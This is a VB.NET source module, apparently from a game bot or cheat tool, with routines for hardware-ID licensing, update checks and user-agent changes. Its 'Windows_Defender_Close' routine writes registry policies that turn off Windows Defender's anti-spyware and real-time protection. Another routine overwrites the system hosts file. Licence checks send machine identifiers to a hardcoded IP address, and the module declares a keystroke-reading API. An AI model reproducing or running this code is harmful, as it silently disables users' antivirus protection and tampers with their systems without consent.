Imports System.Management
Imports System.IO
Imports System.Net
Imports Microsoft.Win32

Module Modules

    '###########################################################

    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
    Dim cpuInfo As String
    Function GetHWID()
        Dim mc As New ManagementClass("win32_processor")
        Dim moc As ManagementObjectCollection = mc.GetInstances
        For Each mo As ManagementObject In moc
            If cpuInfo = "" Then
                cpuInfo = mo.Properties("processorID").Value.ToString
                Exit For
            End If
        Next
        Return cpuInfo
    End Function

    '###########################################################

    <Runtime.InteropServices.DllImport("urlmon.dll", CharSet:=Runtime.InteropServices.CharSet.Ansi)>
    Private Function UrlMkSetSessionOption(
    ByVal dwOption As Integer,
    ByVal pBuffer As String,
    ByVal dwBufferLength As Integer,
    ByVal dwReserved As Integer) As Integer
    End Function
    Const URLMON_OPTION_USERAGENT As Integer = &H10000001

    Public Sub ChangeUserAgent(ByVal Agent As String)
        UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, Agent, Agent.Length, 0)
    End Sub

    '###########################################################

    Public Sub Windows_Defender_Close()
        Dim rehcey As Object
        Dim regKey As RegistryKey
        Dim regKeY1 As RegistryKey
        Dim regKeY2 As RegistryKey
        '-----------------------------------------------------------------------------------------------------------------------------------------------------------
        rehcey = CreateObject("WScript.Shell")
        '-----------------------------------------------------------------------------------------------------------------------------------------------------------
        regKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Policies\Microsoft", True)
        regKey.CreateSubKey("Windows Defender")
        regKey.Close()
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD")
        '-----------------------------------------------------------------------------------------------------------------------------------------------------------
        regKeY1 = Registry.LocalMachine.OpenSubKey("SOFTWARE\Policies\Microsoft\Windows Defender", True)
        regKeY1.CreateSubKey("Real-Time Protection")
        regKeY1.Close()
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", 1, "REG_DWORD")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection", 1, "REG_DWORD")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable", 1, "REG_DWORD")
        '-----------------------------------------------------------------------------------------------------------------------------------------------------------
        regKeY2 = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services", True)
        regKeY2.CreateSubKey("SecurityHealthService")
        regKeY2.Close()
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\DisplayName", "@%systemroot%\system32\SecurityHealthAgent.dll, -1002", "REG_SZ")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\ErrorControl", 1, "REG_DWORD")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\ImagePath", "%SystemRoot%\system32\SecurityHealthService.exe", "REG_EXPAND_SZ")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\Start", 3, "REG_DWORD")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\Type", 10, "REG_DWORD")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\Description", "@%systemroot%\system32\SecurityHealthAgent.dll,-1001", "REG_SZ")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\ObjectName", "LocalSystem", "REG_SZ")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\ServiceSidType", 1, "REG_DWORD")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\LaunchProtected", 2, "REG_DWORD")
    End Sub

    Public Sub Fuck_Bot4League()
        'If fixed Then, use alternative router.
        Try
            System.IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\drivers\etc\hosts", My.Resources.Change_Hosts)
        Catch ex As Exception

        End Try
    End Sub

    Public Sub Licence_Control()
        Tools.Web_Licence1.Navigate("http://185.160.30.211//hg/trxgn.php?raw=" + Tools.Encrypt1.Text)
        Tools.Web_Licence2.Navigate("http://185.160.30.211//hg/atrxg.php?raw=" + Tools.Encrypt1.Text)

        Dim web_client As WebClient = New WebClient()
        Dim sr As New StreamReader("http://185.160.30.211//hg/atrxg.php?raw=" + Tools.Encrypt2.Text)
        Tools.Encrypt2.Text = sr.ReadToEnd

        Login_Form1.Timer_Login.Start()
    End Sub

    Public Sub Apply_UserAgent()
        ChangeUserAgent("A WinHTTP Example Program/1.0")
    End Sub

    Public Sub Check_Update()
        If Login_Form1.Text_Status.Text = "1" Then
            'NO UPDATE CONTROL
        Else
            'YES UPDATE CONTROL
            Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("https://185.160.30.211/checkversion.php")
            Dim response As System.Net.HttpWebResponse = request.GetResponse()
            Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())

            Dim newestversion As String = sr.ReadToEnd()
            Dim currentversion As String = Application.ProductVersion

            If newestversion.Contains(currentversion) = False Then
                Login_Form1.Hide()
                MsgBox("Have new update!", MsgBoxStyle.Information, "")
                Process.Start("http://nyrexscript.com/")
                Application.Exit()
            End If
        End If
    End Sub

    Public Sub Get_Hwid()
        Login_Form1.Text_Hwid.Text = GetHWID() + My.Computer.Name
        Get_Ethernet_Hwid()
    End Sub
End Module
